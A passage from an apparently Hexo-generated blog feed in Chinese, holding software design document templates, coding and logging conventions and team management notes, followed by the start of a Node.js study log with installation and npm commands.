class="line">| 2    | 调试机制   | 如果要很方便进行调试，对设计有什么要求？               |</span><br><span class="line">| 3    | 规范       | 为了后续开发顺利，有什么规范要求？                     |</span><br><span class="line"></span><br><span class="line"><span class="section"># 三、风险分析</span></span><br><span class="line"></span><br><span class="line">本章对模块运行场景和技术风险进行分析，提炼出模块运行各个环节存在的风险，以及实现模块设计目标所存在的风险。本章节需版本总体设计师认可。</span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 场景分析</span></span><br><span class="line"></span><br><span class="line">禁止写一个无，需要结合历史的场景checklist，给出分析结论，并附上结果文档</span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 风险分析</span></span><br><span class="line"></span><br><span class="line">基于模块的设计目标，分析哪些点可能存在风险。基于模块的运行场景，分析各个环节可能遇到的问题，面临的风险。</span><br><span class="line">风险分析可采用头脑风暴方法搜集或使用思维导图分析。风险确定后，需要对风险进行排序，确定风险最大，最需要先解决的问题。分析完成后，按风险从大到小排列填写下表。</span><br><span class="line"></span><br><span class="line"><span class="section"># 四、方案设计</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 方案选型</span></span><br><span class="line"></span><br><span class="line">此章节，需要使用方案选型表对核心需求项的多个可行方案进行选型，确定最终采用的实现方案。</span><br><span class="line">此处简述本设计的可供选型方案，并说明最终所选的方案，以及选择该方案的原因。此章节需最先完成，并且方案选型表讨论通过，才能展开下一步的设计工作。</span><br><span class="line">说明：</span><br><span class="line">1、合理的方式，应该是如下用打分的方式进行判断</span><br><span class="line">2、如果打分有困难，可以选择优缺点评估方式，并叙述最终所选择方案的优点、风险和缺点，目的是只有考虑周全的方案才是合理的，凭借个人经验、对评估准则个人有个人看法的，所选择的方案有可能存在重大风险，埋下地雷。</span><br><span class="line"></span><br><span class="line"><span class="strong">**打分方式**</span></span><br><span class="line"></span><br><span class="line">| 评估准则  | 权重 | 评估方法 | 方案1 | 方案2 | 方案3 | 方案4 |</span><br><span class="line">| --------- | ---- | -------- | ----- | ----- | ----- | ----- |</span><br><span class="line">| 评估准则1 | 50%  |          |       |       |       |       |</span><br><span class="line">| 评估准则2 | 15%  |          |       |       |       |       |</span><br><span class="line">| 评估准则3 | 20%  |          |       |       |       |       |</span><br><span class="line">| 评估准则4 | 15%  |          |       |       |       |       |</span><br><span class="line"></span><br><span class="line"><span class="strong">**优缺点方式**</span></span><br><span class="line"></span><br><span class="line">| 备选方案名称 | 本方案的优点 | 本方案的风险和缺点 | 最终选择 |</span><br><span class="line">| ------------ | ------------ | ------------------ | -------- |</span><br><span class="line">| 方案1        |              |                    |          |</span><br><span class="line">| 方案2        |              |                    |          |</span><br><span class="line">| 方案3        |              |                    |          |</span><br><span class="line">| 方案4        |              |                    |          |</span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 对软件总体架构的影响</span></span><br><span class="line">本章节描述本次新增及调整模块对软件总体架构的影响点，重点参考设计编码红线</span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 模块整体思路</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 3.1. 模块结构</span></span><br><span class="line"></span><br><span class="line">描述模块内部各子模块（或对象/实体）之间的结构关系。描述子模块间协作所涉及的数据结构。</span><br><span class="line">使用 draw.io（可以使用VSCode 插件 Draw.io Integration） 画出模块静态结构图</span><br><span class="line"></span><br><span class="line"><span class="section">### 3.2. 模块流程</span></span><br><span class="line"></span><br><span class="line">描述模块整体业务流程。描述各关键需求点的实现思路。</span><br><span class="line"></span><br><span class="line"><span class="section">## 4. 安全性设计</span></span><br><span class="line"></span><br><span class="line">描述第3章阐述的风险该如何解决，需为每一个风险确定一个行之有效的解决方案。</span><br><span class="line"></span><br><span class="line"><span class="section">### 4.1. 威胁建模分析</span></span><br><span class="line"></span><br><span class="line">威胁建模分析，目的是分析该版本总体设计中涉及到的各个模块实体、数据存储、进程服务、开放端口、交互协议等是否存在相关的安全威胁风险，把风险识别出来并填入如下表格，</span><br><span class="line">采用微软的STRIDE方法来开展威胁建模与安全设计活动，具体方法请与产品线安全经理沟通咨询，或发邮件给SDL邮件群组，进行咨询。</span><br><span class="line"></span><br><span class="line"><span class="section">### 4.2. 安全设计</span></span><br><span class="line"></span><br><span class="line">根据上一节威胁建模识别出来的风险和建议采取的安全措施，各个模块威胁对应的安全机制，在此章节进行详细描述，比如通信协议要加密，就需要设计相关的加密方案。</span><br><span class="line"></span><br><span class="line"><span class="section">## 5. 可靠性设计</span></span><br><span class="line"></span><br><span class="line">分析本模块的每个功能流程运行过程中会出现哪些故障场景（包括在模块流程内部产生的故—例如文件读写失败，以及本模块和其他模块交互时其他模块传递过来或者表现出来的故—例如传递错误的数据或者消息、无响应、超时响应、响应慢），这些故障场景触发的原因以及对本模块流程的影响（中断、卡慢、输出数据错误等等），给出故障容错方案（故障检测方案、故障恢复方案）以避免造成本模块业务流程的失效（中断、卡慢、输出数据错误等等），对于无法自动容错（比如硬盘坏了导致进程无法启动等等）的故障场景需要给出人工介入的处理指导（人工如何感知故障，如何进行恢复）</span><br><span class="line"></span><br><span class="line"><span class="section">## 6. 可维护设计</span></span><br><span class="line"></span><br><span class="line">说明为了系统维护的方便而在程序内部设计中作出的安排，包括在程序中专门安排用于系统的检查与维护的检测点和专用模块。</span><br><span class="line"></span><br><span class="line"><span class="section">## 7. 技术风险解决方案</span></span><br><span class="line"></span><br><span class="line">描述第3章阐述的风险该如何解决，需为每一个风险确定一个行之有效的解决方案。</span><br><span class="line"></span><br><span class="line"><span class="section">### 7.1. XXX方案</span></span><br><span class="line"></span><br><span class="line">描述某个关键技术点的实现方案。每个技术点一个章节。如果该问题有多个可选方案，分析每个方案的优劣点，说明最终采用的方案及其原因，可使用方案选型表进行决策。</span><br><span class="line"></span><br><span class="line"><span class="section">### 7.2. YYY方案</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 五、详细设计</span></span><br><span class="line"></span><br><span class="line">本章节对第4章确定的方案作进一步阐述。把一些关键技术点，尤其是涉及到与其它模块协作的技术点（如某些流程，数据结构，API，消息等），作一个清晰明确的定义。确定遵守本章节描述的内容进行编码可保证风险消除，不引起返工即可。</span><br><span class="line">一般来说，模块间的接口在第2章“设计目标”中已经有阐述，本章描述的模块间协作内容侧重于描述方案中可能会影响到其它模块的一些流程方法，侧重于描述本模块怎么使用其它模块提供的接口。</span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 方案1</span></span><br><span class="line"></span><br><span class="line">根据方案特点，重点从“模块结构/数据结构/交互逻辑/算法/接口/其它”这几个方面选若干个进行阐述，能把解决风险的关键思路和细节描述清楚即可。</span><br><span class="line"></span><br><span class="line"><span class="section"># 六、完成设计自检</span></span><br><span class="line"></span><br><span class="line">此章节，对上述设计内容进行整体自检，并将自检结果备注在6.1和6.2标题后，即通过or不通过，同时，模块设计负责人对以下结果负责，后续出现因设计自检项导致的问题将会进行问题追溯</span><br><span class="line"></span><br><span class="line"><span class="section">## 1.设计自检结果：通过/不通过</span></span><br><span class="line"></span><br><span class="line">根据设计checklist产出最终自检结果</span><br><span class="line"></span><br><span class="line"><span class="section">## 2.不贰过自检结果：通过/不通过</span></span><br><span class="line"></span><br><span class="line">根据不贰过自检列表产出最终自检结果</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 一、设计背景和目标</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**<span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span>交互稿地址:<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span> [<span class="string">xxx</span>](<span class="link">https://xxx</span>)**</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 需求描述</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 设计目标</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 2.1. 设计内容</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 二、需求场景梳理</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 用户使用场景</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 可靠性场景</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 2.1. 性能</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 2.2. 容错</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 可维护性场景</span></span><br><span class="line"></span><br><span class="line">排查和恢复</span><br><span class="line"></span><br><span class="line"><span class="section">### 3.1. 可测试性</span></span><br><span class="line"></span><br><span class="line">如何自动化测试</span><br><span class="line"></span><br><span class="line"><span class="section">### 3.2. 可调试性</span></span><br><span class="line"></span><br><span class="line">开发自己调试方便</span><br><span class="line"></span><br><span class="line"><span class="section">## 4. 兼容性需求</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 三、方案选型</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. xxx</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 背景</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 用户故事</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 对比</span></span><br><span class="line"></span><br><span class="line">|                | xxx | xxx |</span><br><span class="line">| -------------- | --- | --- |</span><br><span class="line">| 复杂度（时间） |     |     |</span><br><span class="line">| 可维护性       |     |     |</span><br><span class="line">| 影响           |     |     |</span><br><span class="line"></span><br><span class="line"><span class="section">### 最终选型</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 四、技术方案</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 五、概要说明</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 整体架构</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 使用场景流程时序</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 客户场景流程时序</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 六、详细设计</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 模块接口定义</span></span><br><span class="line"></span><br><span class="line">接口地址和数据格式，最好有个api接口管理器</span><br><span class="line"></span><br><span class="line"><span class="section">### 1.1. 对外暴露接口和数据结构</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**接口约束**</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.2. 对外暴露错误信息</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.3. 对外通知/触发机制</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.4. 配置文件定义</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 模块关系</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 2.1. 层次关系</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 模块划分结构</span><br><span class="line"></span><br><span class="line"><span class="section">### 2.2. 依赖关系</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 主要关注相互的引用和依赖</span><br><span class="line"></span><br><span class="line"><span class="section">### 2.3. 所属关系</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 主要关注生命周期和持有</span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 进程/线程关系</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 3.1. 任务分析</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**耗时操作**</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**实时性要求**</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**数据同步分析**</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 3.2. 进程/线程模型</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 4. 几个关键业务触发时机</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 5. 日志</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 5.1. 日志打印流程点</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 6. xxx</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 内部数据结构</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 细节流程</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 生命周期</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 七、可靠性</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 性能指标</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 容错处理</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 2.1. 关联影响分析</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 安全分析</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 3.1. 安全建模</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 八、可扩展性</span></span><br><span class="line"></span><br><span class="line">负载增加后如何应对</span><br><span class="line"></span><br><span class="line"><span class="section"># 九、可维护性考虑</span></span><br><span class="line"></span><br><span class="line">可维护性包含运营团队如何观测解决问题、后续新成员如何维护系统、新功能如何增加</span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 运营团队手册</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**原则: 测试都可以排查的，技术支持就可以**</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.1. 问题快速定位方法</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.2. 问题快速恢复方法</span></span><br><span class="line"></span><br><span class="line"><span class="section">### 1.3. 持续观测能力（遥测）</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 可测试性考虑（自动化）</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 可调试性考虑</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 4. 后续演化解决方案（新功能添加）</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 十. 兼容性考虑</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-编码思想"><a href="#5-编码思想" class="headerlink" title="5. 编码思想"></a>5. 编码思想</h2><h3 id="5-1-通用工具类开发"><a href="#5-1-通用工具类开发" class="headerlink" title="5.1. 通用工具类开发"></a>5.1. 通用工具类开发</h3><p>参考目录结构</p>
<img src = "2020_05_07_01.png"/>

<ol>
<li>编码只写公用函数<code>/src/common.sh</code>，对于每个平台的配置和代码单独有一个目录<code>/user/xxx</code></li>
<li>公用函数调用根据平台自己的入口检测返回来决定是否运行此平台配置</li>
<li>输出提供公用库<code>/src/output.py</code>，平台可调用或自己定义<ul>
<li>考虑以<code>key-value</code>的形式</li>
<li>定义优先级</li>
<li>输出各个格式提供接口（markdown、html、json、xml、excel）</li>
</ul>
</li>
<li>对不同平台的开发来说，将模板配置拷贝一份放入<code>/user/xxx</code>下，修改其中的<code>config</code>和<code>src</code>即可</li>
</ol>
<h3 id="5-2-安全相关"><a href="#5-2-安全相关" class="headerlink" title="5.2. 安全相关"></a>5.2. 安全相关</h3><p>参考<a href="/blogs/2020-04-03-secure-develop">安全开发专项笔记</a></p>
<h3 id="5-3-日志"><a href="#5-3-日志" class="headerlink" title="5.3. 日志"></a>5.3. 日志</h3><p><strong>原则</strong></p>
<ul>
<li>出现错误，如果可以客户自己解决，打印用户日志<ul>
<li>能前置解决的产品才是最好的产品</li>
</ul>
</li>
<li>如果需要开发介入，一定要可以从日志中快速定位问题和流程</li>
<li>日志不暴露符号名称，防止被分析逆向</li>
</ul>
<p><strong>日志五要素（日志有效性）</strong></p>
<ul>
<li>What: 什么错误，一般是函数级错误</li>
<li>Reason: 错误信息（排查使用），行级错误和当前状态</li>
<li>CausedBy: 由什么造成（深层次原因）</li>
<li>Will: 造成什么后果，业务级错误</li>
<li>HowTo: 如何进行恢复，给运维人员处理建议</li>
</ul>
<p><strong>等级输出</strong></p>
<ul>
<li>fatal</li>
<li>error是需要人为处理的日志</li>
<li>warn是存在问题，重试可以恢复，如果多次需要提升为error</li>
<li>info一般为生命周期、服务启动、配置变更、审计日志</li>
<li>debug是技术支持和运维人员（非开发人员）可以开启排查使用</li>
<li>trace开发自己调试过程的日志，上线不开启trace</li>
<li>流程分支尽量有日志输出如果太多需要降低等级<ul>
<li>一个流程分支尽量只有一条日志输出，不要每个分支都有一条，可以通过日志定位流程即可</li>
</ul>
</li>
</ul>
<h3 id="5-4-注释"><a href="#5-4-注释" class="headerlink" title="5.4. 注释"></a>5.4. 注释</h3><ul>
<li>代码可以直观了解的不需要注释</li>
<li>代码不可以直观了解或者不告知就无法理解的逻辑需要注释</li>
<li>注释不是描述代码流程，而是解释流程原因</li>
</ul>
<h3 id="5-5-命名规范"><a href="#5-5-命名规范" class="headerlink" title="5.5. 命名规范"></a>5.5. 命名规范</h3><p>仅供参考（主要参考linux源码和python库）</p>
<ul>
<li>变量命名使用下划线</li>
<li>函数命名使用下划线</li>
<li>类命名使用大驼峰</li>
<li>宏定义使用下划线，全字母大写</li>
</ul>
<h3 id="5-6-断言和报错"><a href="#5-6-断言和报错" class="headerlink" title="5.6. 断言和报错"></a>5.6. 断言和报错</h3><ul>
<li>外部输入（纯外部第三方）必须校验，由于外部输入导致的崩溃是不被允许的</li>
<li>如果输入处理完善，内部不会出现的问题，使用断言进行判断</li>
<li>如果外部输入正常，跑动过程出现了异常，使用判断加报错处理</li>
<li>使用智能断言，信息中写明出现的上下文，断言原因机制会保障</li>
</ul>
<h3 id="5-7-代码中文字符处理"><a href="#5-7-代码中文字符处理" class="headerlink" title="5.7. 代码中文字符处理"></a>5.7. 代码中文字符处理</h3><ul>
<li>如果需要使用中文，不能放到代码中去，防止因为编码导致的乱码</li>
<li>需要单独拉出一个json文件或txt文件进行保存，代码进行调用</li>
</ul>
<h2 id="6-项目基础模块"><a href="#6-项目基础模块" class="headerlink" title="6. 项目基础模块"></a>6. 项目基础模块</h2><h3 id="6-1-语言和框架"><a href="#6-1-语言和框架" class="headerlink" title="6.1. 语言和框架"></a>6.1. 语言和框架</h3><p><strong>1. 异常和错误处理</strong></p>
<p><strong>2. 可移植性</strong></p>
<ul>
<li>模块化、插件化</li>
</ul>
<p><strong>3. 集群和分布式</strong></p>
<h3 id="6-2-日志"><a href="#6-2-日志" class="headerlink" title="6.2. 日志"></a>6.2. 日志</h3><p><strong>1. 用户排查日志</strong></p>
<p><strong>2. 开发排查日志</strong></p>
<p><strong>3. 调试日志</strong></p>
<h3 id="6-3-进程-线程-协程管理"><a href="#6-3-进程-线程-协程管理" class="headerlink" title="6.3. 进程&#x2F;线程&#x2F;协程管理"></a>6.3. 进程&#x2F;线程&#x2F;协程管理</h3><p><strong>1. 消息通信机制</strong></p>
<p><strong>2. 无锁的几种实现</strong></p>
<ol>
<li>无锁循环队列</li>
<li>保证逻辑跑在一个线程，如果不在此线程，只push任务（runInLoop()）</li>
</ol>
<h3 id="6-4-公共工具"><a href="#6-4-公共工具" class="headerlink" title="6.4. 公共工具"></a>6.4. 公共工具</h3><p><strong>1. 进程&#x2F;线程锁</strong></p>
<p><strong>2. json解析</strong></p>
<p><strong>3. 共享内存</strong></p>
<p><strong>4. 数据库接口</strong></p>
<p><strong>5. 配置文件接口</strong></p>
<h3 id="6-5-安全"><a href="#6-5-安全" class="headerlink" title="6.5. 安全"></a>6.5. 安全</h3><p><strong>1. 服务和端口管理</strong></p>
<p><strong>2. 密码管理</strong></p>
<p><strong>3. 配置管理</strong></p>
<p><strong>4. 代码管理</strong></p>
<p><strong>5. 数据管理</strong></p>
<h1 id="二、管理"><a href="#二、管理" class="headerlink" title="二、管理"></a>二、管理</h1><h2 id="1-团队凝聚力"><a href="#1-团队凝聚力" class="headerlink" title="1. 团队凝聚力"></a>1. 团队凝聚力</h2><table>
<thead>
<tr>
<th></th>
<th>学生团队</th>
<th>公司团队</th>
</tr>
</thead>
<tbody><tr>
<td>凝聚力源头</td>
<td>无</td>
<td>工资绩效</td>
</tr>
<tr>
<td>影响</td>
<td>无</td>
<td>收入</td>
</tr>
</tbody></table>
<h3 id="学生团队"><a href="#学生团队" class="headerlink" title="学生团队"></a>学生团队</h3><ul>
<li>一人犯错集体受罚</li>
<li>迟到可以连带受罚<ul>
<li>把握好度，不生成怨恨</li>
</ul>
</li>
</ul>
<h3 id="团建"><a href="#团建" class="headerlink" title="团建"></a>团建</h3><ul>
<li>去唱K</li>
<li>吃饭</li>
<li>一起出去玩</li>
<li>适当放假</li>
</ul>
<h3 id="人员和职责"><a href="#人员和职责" class="headerlink" title="人员和职责"></a>人员和职责</h3><ul>
<li>项目经理<ul>
<li>负责项目进度把控</li>
<li>人员和资源协调</li>
<li>组织站会</li>
<li>问题决策</li>
<li>外部对接</li>
</ul>
</li>
<li>敏捷教练(敏捷开发项目需要)<ul>
<li>监督和指导敏捷项目各项流程</li>
<li>敏捷培训</li>
</ul>
</li>
<li>PO团队<ul>
<li>团队只有一个声音给出需求定义</li>
<li>关心用户体验给出界面交互设计方案</li>
</ul>
</li>
<li>研发CTO<ul>
<li>协助项目经理做事</li>
<li>负责版本合入并做代码质量把控和代码走读审查</li>
<li>对版本各方原理熟悉，指导各个研发人员</li>
</ul>
</li>
<li>测试CTO<ul>
<li>负责版本的测试人员测试用例评审</li>
<li>负责各项环境搭建和资源调度</li>
</ul>
</li>
<li>架构师<ul>
<li>根据界面交互设计代码语言、工具、环境</li>
<li>设计代码流程和实现方案</li>
<li>具体问题跟研发人员共同协商解决方案</li>
<li>研发过程实时跟进研发人员的方案是否符合预期</li>
<li><strong>技术问题到架构师为止，保证一定有解决方案</strong></li>
</ul>
</li>
<li>安全专员<ul>
<li>提供安全相关指导</li>
</ul>
</li>
<li>安全测试专员<ul>
<li>提供安全渗透测试用例</li>
<li>发布后出了漏洞的背锅人</li>
</ul>
</li>
</ul>
<h2 id="2-进度管理"><a href="#2-进度管理" class="headerlink" title="2. 进度管理"></a>2. 进度管理</h2><h3 id="进度预估"><a href="#进度预估" class="headerlink" title="进度预估"></a>进度预估</h3><ul>
<li>工具：<code>WBS</code></li>
<li>尽可能细分模块<ul>
<li>预估时间，单位：<code>人天</code></li>
<li>预估好每个人的工作量是否平均</li>
<li>预估每个人的工作效率以及工作质量</li>
</ul>
</li>
<li>风险把控<ul>
<li>每天检查进度，通过进度和计划预估风险</li>
<li>风险提出并想出相应方案解决</li>
<li><strong><font color = red>不要相信成员在时间内能完成，一定要跟进</font></strong></li>
</ul>
</li>
</ul>
<h3 id="里程碑"><a href="#里程碑" class="headerlink" title="里程碑"></a>里程碑</h3><ul>
<li>适当制定里程碑，具有时间节点<ul>
<li>要完成功能</li>
<li>可完成功能</li>
<li>暂时不需要完成的功能</li>
</ul>
</li>
<li>将项目划分为若干个里程碑</li>
<li>做好每个里程碑完不成的方案</li>
</ul>
<h3 id="效率保证"><a href="#效率保证" class="headerlink" title="效率保证"></a>效率保证</h3><ul>
<li>写大概10%的时候找负责人讲思路，防止思路不正确重写</li>
<li>晨会<ul>
<li>昨天做了什么</li>
<li>今天要做什么</li>
<li>有什么问题需要协调</li>
<li>自己模块百分比<ul>
<li>跟踪进度</li>
</ul>
</li>
</ul>
</li>
<li>目标导向<ul>
<li>每天目标</li>
<li>每周目标</li>
<li>每个阶段目标</li>
</ul>
</li>
<li>白板贴纸<ul>
<li>to do</li>
<li>doing</li>
<li>done</li>
</ul>
</li>
<li>bug跟踪记录<ul>
<li>提一个bug<ul>
<li>问题描述</li>
<li>问题复现步骤</li>
<li>问题现象</li>
<li>期望现象</li>
<li>问题环境</li>
<li>问题时间</li>
</ul>
</li>
<li>解决一个bug<ul>
<li>问题定位过程</li>
<li>问题原因描述</li>
<li>改动原理概述</li>
<li>可能影响模块</li>
<li>额外复现步骤</li>
<li>可验证的版本号</li>
</ul>
</li>
<li>bug列表整理到项目管理工具中</li>
</ul>
</li>
</ul>
<h2 id="3-总结收获"><a href="#3-总结收获" class="headerlink" title="3. 总结收获"></a>3. 总结收获</h2><ul>
<li>周会进行总结<ul>
<li>本周计划完成情况</li>
<li>总体进度完成情况</li>
<li>下周计划</li>
<li>个人总结<ul>
<li>做得好的</li>
<li>做的不好的</li>
<li>对团队有什么建议和措施</li>
</ul>
</li>
</ul>
</li>
<li>项目结题总结报告<ol>
<li>代码审查报告</li>
<li>代码扫描报告</li>
<li>系统测试报告</li>
<li>覆盖率报告</li>
<li>单元测试报告</li>
<li>验收过程记录</li>
<li>测试验收报告</li>
<li>设计及方案文档</li>
<li>代码及代码说明文档</li>
<li>使用手册及注意事项</li>
<li>培训资料及培训记录</li>
<li>结项报告</li>
</ol>
</li>
</ul>
<h2 id="4-功能模块开发管理"><a href="#4-功能模块开发管理" class="headerlink" title="4. 功能模块开发管理"></a>4. 功能模块开发管理</h2><h3 id="4-1-项目跟踪"><a href="#4-1-项目跟踪" class="headerlink" title="4.1. 项目跟踪"></a>4.1. 项目跟踪</h3><h4 id="1-记录模板"><a href="#1-记录模板" class="headerlink" title="1) 记录模板"></a>1) 记录模板</h4><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 一、总述</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 负责人:</span><br><span class="line"><span class="bullet">-</span> 开发分支:</span><br><span class="line"></span><br><span class="line"><span class="section"># 二、需求</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 交互稿</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 系统需求</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 需求变更过程</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 三、设计和工作量评估</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 工作量</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 设计</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 四、风险对齐</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 五、缺陷预防（转测活动）</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 1. 威胁建模分析和评审</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 2. 代码走读</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 3. 单测检视</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 六、转测</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 时间:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-工具"><a href="#5-工具" class="headerlink" title="5. 工具"></a>5. 工具</h2><ul>
<li>git管理工具：<code>gitlab</code></li>
<li>代码扫描工具：<code>infer</code>、<code>clov</code></li>
<li>外网穿透：<code>sunny</code></li>
<li>测试自动化框架: <code>robot framework (python)</code></li>
</ul>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>nodejs学习记录</title>
    <url>/blogs/2020-03-23-nodejs/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>本文为nodejs学习记录，包含一些语法和踩坑记，以及一些工具代码技巧等</p>
<p>环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node v12.16.1</span><br></pre></td></tr></table></figure>

<h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h1><h2 id="1-node安装"><a href="#1-node安装" class="headerlink" title="1. node安装"></a>1. node安装</h2><ul>
<li>具体下载地址访问官网下载<code>https://nodejs.org/zh-cn/download/</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget xxxxxx             # 下载官网最新二进制文件包</span><br><span class="line">mkdir temp              # 创建临时目录</span><br><span class="line">tar -xzvf xxxxx.tar.gz -C temp  # 解压到临时目录</span><br><span class="line">sudo mv temp/node_xxx /opt/node # 文件整体移动到opt目录下</span><br><span class="line">sudo ln -s /opt/node/bin/node /usr/local/bin/node   # 添加软链接</span><br><span class="line">sudo ln -s /opt/node/bin/npm /usr/local/bin/npm     # 添加软链接</span><br></pre></td></tr></table></figure>

<h2 id="2-npm-安装第三方包"><a href="#2-npm-安装第三方包" class="headerlink" title="2. npm 安装第三方包"></a>2. npm 安装第三方包</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1. 安装"></a>2.1. 安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-g代表全局安装，不加-g安装到本地目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--save代表保存到package.json中</span></span><br><span class="line">npm install -g xxx --save</span><br></pre></td></tr></table></figure>

<h3 id="2-2-更新"><a href="#2-2-更新" class="headerlink" title="2.2. 更新"></a>2.2. 更新</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级npm</span></span><br><span class="line">npm install -g npm</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用npm-check进行包检查更新</span></span><br><span class="line">npm install -g npm-check</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查包更新，使用-g检查全局包，空格选中，回车安装</span></span><br><span class="line">npm-check -g -u</span><br></pre></td></tr></table></figure>

<h3 id="2-3-只下载源码"><a href="#2-3-只下载源码" class="headerlink" title="2.3. 只下载源码"></a>2.3. 只下载源码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载mathjax的源码包到当前目录</span></span><br><span class="line">npm pack mathjax</span><br></pre></td></tr></table></figure>

